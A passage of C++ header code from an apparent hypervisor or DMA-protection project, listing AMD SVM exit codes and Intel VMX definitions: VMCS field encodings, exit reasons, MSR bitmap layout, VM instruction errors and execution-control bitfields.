    VMEXIT_EXCP16,
    VMEXIT_EXCP17,
    VMEXIT_EXCP18,
    VMEXIT_EXCP19,
    VMEXIT_EXCP20,
    VMEXIT_EXCP21,
    VMEXIT_EXCP22,
    VMEXIT_EXCP23,
    VMEXIT_EXCP24,
    VMEXIT_EXCP25,
    VMEXIT_EXCP26,
    VMEXIT_EXCP27,
    VMEXIT_EXCP28,
    VMEXIT_EXCP29,
    VMEXIT_EXCP30,
    VMEXIT_EXCP31,
    VMEXIT_INTR,
    VMEXIT_NMI,
    VMEXIT_SMI,
    VMEXIT_INIT,
    VMEXIT_VINTR,
    VMEXIT_CR0_SEL_WRITE,
    VMEXIT_IDTR_READ,
    VMEXIT_GDTR_READ,
    VMEXIT_LDTR_READ,
    VMEXIT_TR_READ,
    VMEXIT_IDTR_WRITE,
    VMEXIT_GDTR_WRITE,
    VMEXIT_LDTR_WRITE,
    VMEXIT_TR_WRITE,
    VMEXIT_RDTSC,
    VMEXIT_RDPMC,
    VMEXIT_PUSHF,
    VMEXIT_POPF,
    VMEXIT_CPUID,
    VMEXIT_RSM,
    VMEXIT_IRET,
    VMEXIT_SWINT,
    VMEXIT_INVD,
    VMEXIT_PAUSE,
    VMEXIT_HLT,
    VMEXIT_INVLPG,
    VMEXIT_INVLPGA,
    VMEXIT_IOIO,
    VMEXIT_MSR,
    VMEXIT_TASK_SWITCH,
    VMEXIT_FERR_FREEZE,
    VMEXIT_SHUTDOWN,
    VMEXIT_VMRUN,
    VMEXIT_VMMCALL,
    VMEXIT_VMLOAD,
    VMEXIT_VMSAVE,
    VMEXIT_STGI,
    VMEXIT_CLGI,
    VMEXIT_SKINIT,
    VMEXIT_RDTSCP,
    VMEXIT_ICEBP,
    VMEXIT_WBINVD,
    VMEXIT_MONITOR,
    VMEXIT_MWAIT,
    VMEXIT_MWAIT_CONDITIONAL,
    VMEXIT_XSETBV,
    VMEXIT_EFER_WRITE_TRAP,
    VMEXIT_CR0_WRITE_TRAP,
    VMEXIT_CR1_WRITE_TRAP,
    VMEXIT_CR2_WRITE_TRAP,
    VMEXIT_CR3_WRITE_TRAP,
    VMEXIT_CR4_WRITE_TRAP,
    VMEXIT_CR5_WRITE_TRAP,
    VMEXIT_CR6_WRITE_TRAP,
    VMEXIT_CR7_WRITE_TRAP,
    VMEXIT_CR8_WRITE_TRAP,
    VMEXIT_CR9_WRITE_TRAP,
    VMEXIT_CR10_WRITE_TRAP,
    VMEXIT_CR11_WRITE_TRAP,
    VMEXIT_CR12_WRITE_TRAP,
    VMEXIT_CR13_WRITE_TRAP,
    VMEXIT_CR14_WRITE_TRAP,
    VMEXIT_CR15_WRITE_TRAP,
    VMEXIT_NPF = 0x400,
    AVIC_INCOMPLETE_IPI,
    AVIC_NOACCEL,
    VMEXIT_VMGEXIT
};



} // namespace Svm
```

`DmaProtect/include/Arch/Vmx.h`:

```h
#pragma once

namespace Vmx
{



struct alignas(0x1000) Vmcs
{
    union
    {
        unsigned int val;
        struct
        {
            unsigned int VmcsRevisionId : 31;
            unsigned int ShadowVmcsIndicator : 1;
        } fields;
    } RevisionId;
    unsigned int VmxAbortIndicator;
    unsigned char VmcsData[0x1000 - sizeof(RevisionId) - sizeof(VmxAbortIndicator)];
};
static_assert(sizeof(Vmcs) == 0x1000);

enum class VmcsFieldEncoding : unsigned int
{
    // 16-bit control fields:
    VMCS_FIELD_VIRTUAL_PROCESSOR_IDENTIFIER = 0x00000000,
    VMCS_FIELD_POSTED_INTERRUPT_NOTIFICATION_VECTOR = 0x00000002,
    VMCS_FIELD_EPTP_INDEX = 0x00000004,

    // 16-bit guest-state fields:
    VMCS_FIELD_GUEST_ES_SELECTOR = 0x00000800,
    VMCS_FIELD_GUEST_CS_SELECTOR = 0x00000802,
    VMCS_FIELD_GUEST_SS_SELECTOR = 0x00000804,
    VMCS_FIELD_GUEST_DS_SELECTOR = 0x00000806,
    VMCS_FIELD_GUEST_FS_SELECTOR = 0x00000808,
    VMCS_FIELD_GUEST_GS_SELECTOR = 0x0000080A,
    VMCS_FIELD_GUEST_LDTR_SELECTOR = 0x0000080C,
    VMCS_FIELD_GUEST_TR_SELECTOR = 0x0000080E,
    VMCS_FIELD_GUEST_INTERRUPT_STATUS = 0x00000810,
    VMCS_FIELD_PML_INDEX = 0x00000812,

    // 16-bit host-state fields:
    VMCS_FIELD_HOST_ES_SELECTOR = 0x00000C00,
    VMCS_FIELD_HOST_CS_SELECTOR = 0x00000C02,
    VMCS_FIELD_HOST_SS_SELECTOR = 0x00000C04,
    VMCS_FIELD_HOST_DS_SELECTOR = 0x00000C06,
    VMCS_FIELD_HOST_FS_SELECTOR = 0x00000C08,
    VMCS_FIELD_HOST_GS_SELECTOR = 0x00000C0A,
    VMCS_FIELD_HOST_TR_SELECTOR = 0x00000C0C,

    // 64-bit control fields:
    VMCS_FIELD_ADDRESS_OF_IO_BITMAP_A_FULL = 0x00002000,
    VMCS_FIELD_ADDRESS_OF_IO_BITMAP_A_HIGH = 0x00002001,
    VMCS_FIELD_ADDRESS_OF_IO_BITMAP_B_FULL = 0x00002002,
    VMCS_FIELD_ADDRESS_OF_IO_BITMAP_B_HIGH = 0x00002003,
    VMCS_FIELD_ADDRESS_OF_MSR_BITMAPS_FULL = 0x00002004,
    VMCS_FIELD_ADDRESS_OF_MSR_BITMAPS_HIGH = 0x00002005,
    VMCS_FIELD_VMEXIT_MSR_STORE_ADDRESS_FULL = 0x00002006,
    VMCS_FIELD_VMEXIT_MSR_STORE_ADDRESS_HIGH = 0x00002007,
    VMCS_FIELD_VMEXIT_MSR_LOAD_ADDRESS_FULL = 0x00002008,
    VMCS_FIELD_VMEXIT_MSR_LOAD_ADDRESS_HIGH = 0x00002009,
    VMCS_FIELD_VMENTRY_MSR_LOAD_ADDRESS_FULL = 0x0000200A,
    VMCS_FIELD_VMENTRY_MSR_LOAD_ADDRESS_HIGH = 0x0000200B,
    VMCS_FIELD_EXECUTIVE_VMCS_POINTER_FULL = 0x0000200C,
    VMCS_FIELD_EXECUTIVE_VMCS_POINTER_HIGH = 0x0000200D,
    VMCS_FIELD_PML_ADDRESS_FULL = 0x0000200E,
    VMCS_FIELD_PML_ADDRESS_HIGH = 0x0000200F,
    VMCS_FIELD_TSC_OFFSET_FULL = 0x00002010,
    VMCS_FIELD_TSC_OFFSET_HIGH = 0x00002011,
    VMCS_FIELD_VIRTUAL_APIC_ADDRESS_FULL = 0x00002012,
    VMCS_FIELD_VIRTUAL_APIC_ADDRESS_HIGH = 0x00002013,
    VMCS_FIELD_APIC_ACCESS_ADDRESS_FULL = 0x00002014,
    VMCS_FIELD_APIC_ACCESS_ADDRESS_HIGH = 0x00002015,
    VMCS_FIELD_POSTED_INTERRUPT_DESCRIPTOR_ADDRESS_FULL = 0x00002016,
    VMCS_FIELD_POSTED_INTERRUPT_DESCRIPTOR_ADDRESS_HIGH = 0x00002017,
    VMCS_FIELD_VM_FUNCTIONS_CONTROL_FULL = 0x00002018,
    VMCS_FIELD_VM_FUNCTIONS_CONTROL_HIGH = 0x00002019,
    VMCS_FIELD_EPT_POINTER_FULL = 0x0000201A,
    VMCS_FIELD_EPT_POINTER_HIGH = 0x0000201B,
    VMCS_FIELD_EOI_EXIT_BITMAP_0_FULL = 0x0000201C,
    VMCS_FIELD_EOI_EXIT_BITMAP_0_HIGH = 0x0000201D,
    VMCS_FIELD_EOI_EXIT_BITMAP_1_FULL = 0x0000201E,
    VMCS_FIELD_EOI_EXIT_BITMAP_1_HIGH = 0x0000201F,
    VMCS_FIELD_EOI_EXIT_BITMAP_2_FULL = 0x00002020,
    VMCS_FIELD_EOI_EXIT_BITMAP_2_HIGH = 0x00002021,
    VMCS_FIELD_EOI_EXIT_BITMAP_3_FULL = 0x00002022,
    VMCS_FIELD_EOI_EXIT_BITMAP_3_HIGH = 0x00002023,
    VMCS_FIELD_EPTP_LIST_ADDRESS_FULL = 0x00002024,
    VMCS_FIELD_EPTP_LIST_ADDRESS_HIGH = 0x00002025,
    VMCS_FIELD_VMREAD_BITMAP_ADDRESS_FULL = 0x00002026,
    VMCS_FIELD_VMREAD_BITMAP_ADDRESS_HIGH = 0x00002027,
    VMCS_FIELD_VMWRITE_BITMAP_ADDRESS_FULL = 0x00002028,
    VMCS_FIELD_VMWRITE_BITMAP_ADDRESS_HIGH = 0x00002029,
    VMCS_FIELD_VIRTUALIZATION_EXCEPTION_INFORMATION_ADDRESS_FULL = 0x0000202A,
    VMCS_FIELD_VIRTUALIZATION_EXCEPTION_INFORMATION_ADDRESS_HIGH = 0x0000202B,
    VMCS_FIELD_XSS_EXITING_BITMAP_FULL = 0x0000202C,
    VMCS_FIELD_XSS_EXITING_BITMAP_HIGH = 0x0000202D,
    VMCS_FIELD_ENCLS_EXITING_BITMAP_FULL = 0x0000202E,
    VMCS_FIELD_ENCLS_EXITING_BITMAP_HIGH = 0x0000202F,
    VMCS_FIELD_SUBPAGE_PERMISSION_TABLE_POINTER_FULL = 0x00002030,
    VMCS_FIELD_SUBPAGE_PERMISSION_TABLE_POINTER_HIGH = 0x00002031,
    VMCS_FIELD_TSC_MULTIPLIER_FULL = 0x00002032,
    VMCS_FIELD_TSC_MULTIPLIER_HIGH = 0x00002033,

    // 64-bit read-only data fields:
    VMCS_FIELD_GUEST_PHYSICAL_ADDRESS_FULL = 0x00002400,
    VMCS_FIELD_GUEST_PHYSICAL_ADDRESS_HIGH = 0x00002401,

    // 64-bit guest state fields:
    VMCS_FIELD_VMCS_LINK_POINTER_FULL = 0x00002800,
    VMCS_FIELD_VMCS_LINK_POINTER_HIGH = 0x00002801,
    VMCS_FIELD_GUEST_IA32_DEBUGCTL_FULL = 0x00002802,
    VMCS_FIELD_GUEST_IA32_DEBUGCTL_HIGH = 0x00002803,
    VMCS_FIELD_GUEST_IA32_PAT_FULL = 0x00002804,
    VMCS_FIELD_GUEST_IA32_PAT_HIGH = 0x00002805,
    VMCS_FIELD_GUEST_IA32_EFER_FULL = 0x00002806,
    VMCS_FIELD_GUEST_IA32_EFER_HIGH = 0x00002807,
    VMCS_FIELD_GUEST_IA32_PERF_GLOBAL_CTRL_FULL = 0x00002808,
    VMCS_FIELD_GUEST_IA32_PERF_GLOBAL_CTRL_HIGH = 0x00002809,
    VMCS_FIELD_GUEST_PDPTE_0_FULL = 0x0000280A,
    VMCS_FIELD_GUEST_PDPTE_0_HIGH = 0x0000280B,
    VMCS_FIELD_GUEST_PDPTE_1_FULL = 0x0000280C,
    VMCS_FIELD_GUEST_PDPTE_1_HIGH = 0x0000280D,
    VMCS_FIELD_GUEST_PDPTE_2_FULL = 0x0000280E,
    VMCS_FIELD_GUEST_PDPTE_2_HIGH = 0x0000280F,
    VMCS_FIELD_GUEST_PDPTE_3_FULL = 0x00002810,
    VMCS_FIELD_GUEST_PDPTE_3_HIGH = 0x00002811,
    VMCS_FIELD_GUEST_IA32_BNDCFGS_FULL = 0x00002812,
    VMCS_FIELD_GUEST_IA32_BNDCFGS_HIGH = 0x00002813,
    VMCS_FIELD_GUEST_IA32_RTIT_CTL_FULL = 0x00002814,
    VMCS_FIELD_GUEST_IA32_RTIT_CTL_HIGH = 0x00002815,

    // 64-bit host-state fields:
    VMCS_FIELD_HOST_IA32_PAT_FULL = 0x00002C00,
    VMCS_FIELD_HOST_IA32_PAT_HIGH = 0x00002C01,
    VMCS_FIELD_HOST_IA32_EFER_FULL = 0x00002C02,
    VMCS_FIELD_HOST_IA32_EFER_HIGH = 0x00002C03,
    VMCS_FIELD_HOST_IA32_PERF_GLOBAL_CTRL_FULL = 0x00002C04,
    VMCS_FIELD_HOST_IA32_PERF_GLOBAL_CTRL_HIGH = 0x00002C05,

    // 32-bit control fields:
    VMCS_FIELD_PIN_BASED_VM_EXECUTION_CONTROLS = 0x00004000,
    VMCS_FIELD_PRIMARY_PROCESSOR_BASED_VM_EXECUTION_CONTROLS = 0x00004002,
    VMCS_FIELD_EXCEPTION_BITMAP = 0x00004004,
    VMCS_FIELD_PAGE_FAULT_ERROR_CODE_MASK = 0x00004006,
    VMCS_FIELD_PAGE_FAULT_ERROR_CODE_MATCH = 0x00004008,
    VMCS_FIELD_CR3_TARGET_COUNT = 0x0000400A,
    VMCS_FIELD_VMEXIT_CONTROLS = 0x0000400C,
    VMCS_FIELD_VMEXIT_MSR_STORE_COUNT = 0x0000400E,
    VMCS_FIELD_VMEXIT_MSR_LOAD_COUNT = 0x00004010,
    VMCS_FIELD_VMENTRY_CONTROLS = 0x00004012,
    VMCS_FIELD_VMENTRY_MSR_LOAD_COUNT = 0x00004014,
    VMCS_FIELD_VMENTRY_INTERRUPTION_INFORMATION_FIELD = 0x00004016,
    VMCS_FIELD_VMENTRY_EXCEPTION_ERROR_CODE = 0x00004018,
    VMCS_FIELD_VMENTRY_INSTRUCTION_LENGTH = 0x0000401A,
    VMCS_FIELD_TPR_THRESHOLD = 0x0000401C,
    VMCS_FIELD_SECONDARY_PROCESSOR_BASED_VM_EXECUTION_CONTROLS = 0x0000401E,
    VMCS_FIELD_PLE_GAP = 0x00004020,
    VMCS_FIELD_PLE_WINDOW = 0x00004022,

    // 32-bit read-only data fields:
    VMCS_FIELD_VM_INSTRUCTION_ERROR = 0x00004400,
    VMCS_FIELD_EXIT_REASON = 0x00004402,
    VMCS_FIELD_VMEXIT_INTERRUPTION_INFORMATION = 0x00004404,
    VMCS_FIELD_VMEXIT_INTERRUPTION_ERROR_CODE = 0x00004406,
    VMCS_FIELD_IDT_VECTORING_INFORMATION_FIELD = 0x00004408,
    VMCS_FIELD_IDT_VECTORING_ERROR_CODE = 0x0000440A,
    VMCS_FIELD_VMEXIT_INSTRUCTION_LENGTH = 0x0000440C,
    VMCS_FIELD_VMEXIT_INSTRUCTION_INFORMATION = 0x0000440E,

    // 32-bit guest-state fields:
    VMCS_FIELD_GUEST_ES_LIMIT = 0x00004800,
    VMCS_FIELD_GUEST_CS_LIMIT = 0x00004802,
    VMCS_FIELD_GUEST_SS_LIMIT = 0x00004804,
    VMCS_FIELD_GUEST_DS_LIMIT = 0x00004806,
    VMCS_FIELD_GUEST_FS_LIMIT = 0x00004808,
    VMCS_FIELD_GUEST_GS_LIMIT = 0x0000480A,
    VMCS_FIELD_GUEST_LDTR_LIMIT = 0x0000480C,
    VMCS_FIELD_GUEST_TR_LIMIT = 0x0000480E,
    VMCS_FIELD_GUEST_GDTR_LIMIT = 0x00004810,
    VMCS_FIELD_GUEST_IDTR_LIMIT = 0x00004812,
    VMCS_FIELD_GUEST_ES_ACCESS_RIGHTS = 0x00004814,
    VMCS_FIELD_GUEST_CS_ACCESS_RIGHTS = 0x00004816,
    VMCS_FIELD_GUEST_SS_ACCESS_RIGHTS = 0x00004818,
    VMCS_FIELD_GUEST_DS_ACCESS_RIGHTS = 0x0000481A,
    VMCS_FIELD_GUEST_FS_ACCESS_RIGHTS = 0x0000481C,
    VMCS_FIELD_GUEST_GS_ACCESS_RIGHTS = 0x0000481E,
    VMCS_FIELD_GUEST_LDTR_ACCESS_RIGHTS = 0x00004820,
    VMCS_FIELD_GUEST_TR_ACCESS_RIGHTS = 0x00004822,
    VMCS_FIELD_GUEST_INTERRUPTIBILITY_STATE = 0x00004824,
    VMCS_FIELD_GUEST_ACTIVITY_STATE = 0x00004826,
    VMCS_FIELD_GUEST_SMBASE = 0x00004828,
    VMCS_FIELD_GUEST_IA32_SYSENTER_CS = 0x0000482A,
    VMCS_FIELD_VMX_PREEMPTION_TIMER_VALUE = 0x0000482E,

    // 32-bit host-state fields:
    VMCS_FIELD_HOST_IA32_SYSENTER_CS = 0x00004C00,

    // Natural-width control fields:
    VMCS_FIELD_CR0_GUEST_HOST_MASK = 0x00006000,
    VMCS_FIELD_CR4_GUEST_HOST_MASK = 0x00006002,
    VMCS_FIELD_CR0_READ_SHADOW = 0x00006004,
    VMCS_FIELD_CR4_READ_SHADOW = 0x00006006,
    VMCS_FIELD_CR3_TARGET_VALUE_0 = 0x00006008,
    VMCS_FIELD_CR3_TARGET_VALUE_1 = 0x0000600A,
    VMCS_FIELD_CR3_TARGET_VALUE_2 = 0x0000600C,
    VMCS_FIELD_CR3_TARGET_VALUE_3 = 0x0000600E,

    // Natural-width read-only data fields:
    VMCS_FIELD_EXIT_QUALIFICATION = 0x00006400,
    VMCS_FIELD_IO_RCX = 0x00006402,
    VMCS_FIELD_IO_RSI = 0x00006404,
    VMCS_FIELD_IO_RDI = 0x00006406,
    VMCS_FIELD_IO_RIP = 0x00006408,
    VMCS_FIELD_GUEST_LINEAR_ADDRESS = 0x0000640A,

    // Natural-width guest-state fields:
    VMCS_FIELD_GUEST_CR0 = 0x00006800,
    VMCS_FIELD_GUEST_CR3 = 0x00006802,
    VMCS_FIELD_GUEST_CR4 = 0x00006804,
    VMCS_FIELD_GUEST_ES_BASE = 0x00006806,
    VMCS_FIELD_GUEST_CS_BASE = 0x00006808,
    VMCS_FIELD_GUEST_SS_BASE = 0x0000680A,
    VMCS_FIELD_GUEST_DS_BASE = 0x0000680C,
    VMCS_FIELD_GUEST_FS_BASE = 0x0000680E,
    VMCS_FIELD_GUEST_GS_BASE = 0x00006810,
    VMCS_FIELD_GUEST_LDTR_BASE = 0x00006812,
    VMCS_FIELD_GUEST_TR_BASE = 0x00006814,
    VMCS_FIELD_GUEST_GDTR_BASE = 0x00006816,
    VMCS_FIELD_GUEST_IDTR_BASE = 0x00006818,
    VMCS_FIELD_GUEST_DR7 = 0x0000681A,
    VMCS_FIELD_GUEST_RSP = 0x0000681C,
    VMCS_FIELD_GUEST_RIP = 0x0000681E,
    VMCS_FIELD_GUEST_RFLAGS = 0x00006820,
    VMCS_FIELD_GUEST_PENDING_DEBUG_EXCEPTIONS = 0x00006822,
    VMCS_FIELD_GUEST_IA32_SYSENTER_ESP = 0x00006824,
    VMCS_FIELD_GUEST_IA32_SYSENTER_EIP = 0x00006826,
    VMCS_FIELD_GUEST_IA32_S_CET = 0x00006828,
    VMCS_FIELD_GUEST_SSP = 0x0000682A,
    VMCS_FIELD_GUEST_IA32_INTERRUPT_SSP_TABLE_ADDR = 0x0000682C,

    // Natural-width host-state fields:
    VMCS_FIELD_HOST_CR0 = 0x00006C00,
    VMCS_FIELD_HOST_CR3 = 0x00006C02,
    VMCS_FIELD_HOST_CR4 = 0x00006C04,
    VMCS_FIELD_HOST_FS_BASE = 0x00006C06,
    VMCS_FIELD_HOST_GS_BASE = 0x00006C08,
    VMCS_FIELD_HOST_TR_BASE = 0x00006C0A,
    VMCS_FIELD_HOST_GDTR_BASE = 0x00006C0C,
    VMCS_FIELD_HOST_IDTR_BASE = 0x00006C0E,
    VMCS_FIELD_HOST_IA32_SYSENTER_ESP = 0x00006C10,
    VMCS_FIELD_HOST_IA32_SYSENTER_EIP = 0x00006C12,
    VMCS_FIELD_HOST_RSP = 0x00006C14,
    VMCS_FIELD_HOST_RIP = 0x00006C16,
    VMCS_FIELD_HOST_IA32_S_CET = 0x00006C18,
    VMCS_FIELD_HOST_SSP = 0x00006C1A,
    VMCS_FIELD_HOST_IA32_INTERRUPT_SSP_TABLE_ADDR = 0x00006C1C,
};

union VmcsComponentEncoding
{
    unsigned int val;
    VmcsFieldEncoding field;
    struct
    {
        unsigned int AccessType : 1; // 0 = full, 1 = high; must be full for 16-bit, 32-bit, and natural-width fields
        unsigned int Index : 9;
        unsigned int Type : 2; // 0 = control, 1 = VMexit information, 2 = guest state, 3 = host state
        unsigned int Reserved0 : 1; // Must be zero
        unsigned int Width : 2; // 0 = 16-bit, 1 = 64-bit, 2 = 32-bit, 3 = natural width
        unsigned int Reserved1 : 17; // Must be zero
    } fields;
};
static_assert(sizeof(VmcsComponentEncoding) == sizeof(unsigned int));

enum class VmxExitReason : unsigned int
{
    EXIT_REASON_EXCEPTION_OR_NMI = 0,
    EXIT_REASON_EXTERNAL_INTERRUPT = 1,
    EXIT_REASON_TRIPLE_FAULT = 2,
    EXIT_REASON_INIT_SIGNAL = 3,
    EXIT_REASON_SIPI = 4, // Startup IPI
    EXIT_REASON_IO_SMI = 5,
    EXIT_REASON_OTHER_SMI = 6,
    EXIT_REASON_INTERRUPT_WINDOW = 7,
    EXIT_REASON_NMI_WINDOW = 8,
    EXIT_REASON_TASK_SWITCH = 9,
    EXIT_REASON_CPUID = 10,
    EXIT_REASON_GETSEC = 11,
    EXIT_REASON_HLT = 12,
    EXIT_REASON_INVD = 13,
    EXIT_REASON_INVLPG = 14,
    EXIT_REASON_RDPMC = 15,
    EXIT_REASON_RDTSC = 16,
    EXIT_REASON_RSM = 17,
    EXIT_REASON_VMCALL = 18,
    EXIT_REASON_VMCLEAR = 19,
    EXIT_REASON_VMLAUNCH = 20,
    EXIT_REASON_VMPTRLD = 21,
    EXIT_REASON_VMPTRST = 22,
    EXIT_REASON_VMREAD = 23,
    EXIT_REASON_VMRESUME = 24,
    EXIT_REASON_VMWRITE = 25,
    EXIT_REASON_VMXOFF = 26,
    EXIT_REASON_VMXON = 27,
    EXIT_REASON_CR_ACCESS = 28,
    EXIT_REASON_DR_ACCESS = 29,
    EXIT_REASON_IO_INSTRUCTION = 30,
    EXIT_REASON_RDMSR = 31,
    EXIT_REASON_WRMSR = 32,
    EXIT_REASON_INVALID_GUEST_STATE = 33,
    EXIT_REASON_MSR_LOADING_FAILURE = 34,
    EXIT_REASON_MWAIT = 36,
    EXIT_REASON_MONITOR_TRAP_FLAG = 37,
    EXIT_REASON_MONITOR = 39,
    EXIT_REASON_PAUSE = 40,
    EXIT_REASON_MACHINE_CHECK_EVENT_FAILURE = 41,
    EXIT_REASON_TPR_BELOW_THRESHOLD = 43,
    EXIT_REASON_APIC_ACCESS = 44,
    EXIT_REASON_VIRTUALIZED_EOI = 45,
    EXIT_REASON_GDTR_OR_IDTR_ACCESS = 46,
    EXIT_REASON_LDTR_OR_TR_ACCESS = 47,
    EXIT_REASON_EPT_VIOLATION = 48,
    EXIT_REASON_EPT_MISCONFIGURATION = 49,
    EXIT_REASON_INVEPT = 50,
    EXIT_REASON_RDTSCP = 51,
    EXIT_REASON_VMX_PREEMPTION_TIMER_EXPIRED = 52,
    EXIT_REASON_INVVPID = 53,
    EXIT_REASON_WBINVD = 54,
    EXIT_REASON_XSETBV = 55,
    EXIT_REASON_APIC_WRITE = 56,
    EXIT_REASON_RDRAND = 57,
    EXIT_REASON_INVPCID = 58,
    EXIT_REASON_VNFUNC = 59,
    EXIT_REASON_ENCLS = 60,
    EXIT_REASON_RDSEED = 61,
    EXIT_REASON_PAGE_MODIFICATION_LOG_FULL = 62,
    EXIT_REASON_XSAVES = 63,
    EXIT_REASON_XRSTORS = 64,
    EXIT_REASON_PCOMMIT = 65,
    EXIT_REASON_SPP_RELATED_EVENT = 66,
    EXIT_REASON_UMWAIT = 67,
    EXIT_REASON_TPAUSE = 68,
};

union MsrBitmap
{
    unsigned char raw[4096];
    struct
    {
        unsigned char read00000000to00001FFF[1024];
        unsigned char readC0000000toC0001FFF[1024];
        unsigned char write00000000to00001FFF[1024];
        unsigned char writeC0000000toC0001FFF[1024];
    } fields;
};
static_assert(sizeof(MsrBitmap) == 4096);

enum VmInstructionError : unsigned int
{
    VmcallExecutedInVmxRootOperation = 1,
    VmclearWithInvalidPhysicalAddress = 2,
    VmclearWithVmxonPointer = 3,
    VmlaunchWithNonClearVmcs = 4,
    VmresumeWithNonLaunchedVmcs = 5,
    VmresumeAfterVmxoff = 6,
    VmentryWithInvalidControlFields = 7,
    VmentryWithInvalidHostStateFields = 8,
    VmptrldWithInvalidPhysicalAddress = 9,
    VmptrldWithVmxonPointer = 10,
    VmptrldWithIncorrectVmcsRevisionIdentifier = 11,
    VmreadVmwriteFromToUnsupportedVmcsComponent = 12,
    VmwriteToReadonlyVmcsComponent = 13,
    VmxonExecutedInVmxRootOperation = 15,
    VmentryWithInvalidExecutiveVmcsPointer = 16,
    VmentryWithNonLaunchedExecutiveVmcs = 17,
    VmentryWithExecutiveVmcsPointerNotVmxonPointer = 18,
    VmcallWithNonClearVmcs = 19,
    VmcallWithInvalidVmexitControlFields = 20,
    VmcallWithIncorrectMsegRevisionIdentifier = 22,
    VmxoffUnderDualMonitorTreatmentOfSmisAndSmm = 23,
    VmcallWithInvalidSmmMonitorFeatures = 24,
    VmentryWithInvalidVmExecutionControlFieldsInExecutiveVmcs = 25,
    VmentryWithEventsBlockedByMovSs = 26,
    InvalidOperandToInveptInvvpid = 28
};

union SegmentAccessRights
{
    unsigned int val;
    struct
    {
        unsigned int SegmentType : 4;
        unsigned int S : 1; // Descriptor type (0 = system, 1 = code or data)
        unsigned int DPL : 2; // Descriptor privilege level
        unsigned int P : 1; // Segment present
        unsigned int Reserved0 : 4;
        unsigned int AVL : 1; // Available for use by system software
        unsigned int L : 1; // Reserved except for CS, 64-bit mode active (for CS only)
        unsigned int DB : 1; // Default operation size (0 = 16-bit segment, 1 = 32-bit segment)
        unsigned int G : 1; // Granularity
        unsigned int SegmentUnusable : 1; // 0 = usable, 1 = unusable
        unsigned int Reserved1 : 15;
    } fields;
};
static_assert(sizeof(SegmentAccessRights) == sizeof(unsigned int));

// Consult with the IA32_VMX_PINBASED_CTLS and IA32_VMX_TRUE_PINBASED_CTLS
// to determine how to set the reserved bits properly if you need it:
union PinBasedVmExecutionControls
{
    unsigned int val;
    struct
    {
        unsigned int ExternalInterruptExiting : 1;
        unsigned int ReservedBit1 : 1; // Must be 1
        unsigned int ReservedBit2 : 1; // Must be 1
        unsigned int NmiExiting : 1;
        unsigned int ReservedBit4 : 1; // Must be 1
        unsigned int VirtualNmis : 1;
        unsigned int ActivateVmxPreemptionTimer : 1;
        unsigned int ProcessPostedInterrupts : 1;
        unsigned int ReservedBit8 : 1;
        unsigned int ReservedBit9 : 1;
        unsigned int ReservedBit10 : 1;
        unsigned int ReservedBit11 : 1;
        unsigned int ReservedBit12 : 1;
        unsigned int ReservedBit13 : 1;
        unsigned int ReservedBit14 : 1;
        unsigned int ReservedBit15 : 1;
        unsigned int ReservedBit16 : 1;
        unsigned int ReservedBit17 : 1;
        unsigned int ReservedBit18 : 1;
        unsigned int ReservedBit19 : 1;
        unsigned int ReservedBit20 : 1;
        unsigned int ReservedBit21 : 1;
        unsigned int ReservedBit22 : 1;
        unsigned int ReservedBit23 : 1;
        unsigned int ReservedBit24 : 1;
        unsigned int ReservedBit25 : 1;
        unsigned int ReservedBit26 : 1;
        unsigned int ReservedBit27 : 1;
        unsigned int ReservedBit28 : 1;
        unsigned int ReservedBit29 : 1;
        unsigned int ReservedBit30 : 1;
        unsigned int ReservedBit31 : 1;
    } fields;
};
static_assert(sizeof(PinBasedVmExecutionControls) == sizeof(unsigned int));

// Consult with the IA32_VMX_PROCBASED_CTLS and IA32_VMX_TRUE_PROCBASED_CTLS
// to determine how to set the reserved bits:
union PrimaryProcessorBasedVmExecutionControls
{
    unsigned int val;
    struct
    {
        unsigned int ReservedBit0 : 1;
        unsigned int ReservedBit1 : 1; // Must be 1
        unsigned int InterruptWindowExiting : 1;
        unsigned int UseTscOffsetting : 1;
        unsigned int ReservedBit4 : 1; // Must be 1
        unsigned int ReservedBit5 : 1; // Must be 1
        unsigned int ReservedBit6 : 1; // Must be 1
        unsigned int HltExiting : 1;
        unsigned int ReservedBit8 : 1; // Must be 1
        unsigned int InvlpgExiting : 1;
        unsigned int MwaitExiting : 1;
        unsigned int RdpmcExiting : 1;
        unsigned int RdtscExiting : 1;
        unsigned int ReservedBit13 : 1; // Must be 1
        unsigned int ReservedBit14 : 1; // Must be 1
        unsigned int Cr3LoadExiting : 1; // Must be 1
        unsigned int Cr3StoreExiting : 1; // Must be 1
        unsigned int ReservedBit17 : 1;
        unsigned int ReservedBit18 : 1;
        unsigned int Cr8LoadExiting : 1;
        unsigned int Cr8StoreExiting : 1;
        unsigned int UseTprShadow : 1;
        unsigned int NmiWindowExiting : 1;
        unsigned int MovDrExiting : 1;
        unsigned int UnconditionalIoExiting : 1;
        unsigned int UseIoBitmaps : 1;
        unsigned int ReservedBit26 : 1; // Must be 1
        unsigned int MonitorTrapFlag : 1;
        unsigned int UseMsrBitmaps : 1;
        unsigned int MonitorExiting : 1;
        unsigned int PauseExiting : 1;
        unsigned int ActivateSecondaryControls : 1;
    } fields;
};
static_assert(sizeof(PrimaryProcessorBasedVmExecutionControls) == sizeof(unsigned int));

// Consult with the IA32_VMX_EXIT_CTLS and IA32_VMX_TRUE_EXIT_CTLS
// to determine how to set the reserved bits:
union VmexitControls
{
    unsigned int val;
    struct
    {
        unsigned int ReservedBit0 : 1;
        unsigned int ReservedBit1 : 1;
        unsigned int SaveDebugControls : 1; // Whether DR7 and the IA32_DEBUGCTL are saved on VM exit
        unsigned int ReservedBit3 : 1;
        unsigned int ReservedBit4 : 1;
        unsigned int ReservedBit5 : 1;
        unsigned int ReservedBit6 : 1;
        unsigned int ReservedBit7 : 1;
        unsigned int ReservedBit8 : 1;
        unsigned int HostAddressSpaceSize : 1; // Whether a logical processor is in 64-bit mode after the next VM exit, its value is loaded into CS.L, IA32_EFER.LME and IA32_EFER.LMA on every VM exit
        unsigned int ReservedBit10 : 1;
        unsigned int ReservedBit11 : 1;
        unsigned int LoadIa32PerfGlobalCtrl : 1; // Whether the IA32_PERF_GLOBAL_CTL is loaded on VM exit
        unsigned int ReservedBit13 : 1;
        unsigned int ReservedBit14 : 1;
        unsigned int AcknowledgeInterruptOnExit : 1;
        unsigned int ReservedBit16 : 1;
        unsigned int ReservedBit17 : 1;
        unsigned int SaveIa32Pat : 1;
        unsigned int LoadIa32Pat : 1;
        unsigned int SaveIa32Efer : 1;
        unsigned int LoadIa32Efer : 1;
        unsigned int SaveVmxPreemptionTimerValue : 1;
        unsigned int ClearIa32Bndcfgs : 1;
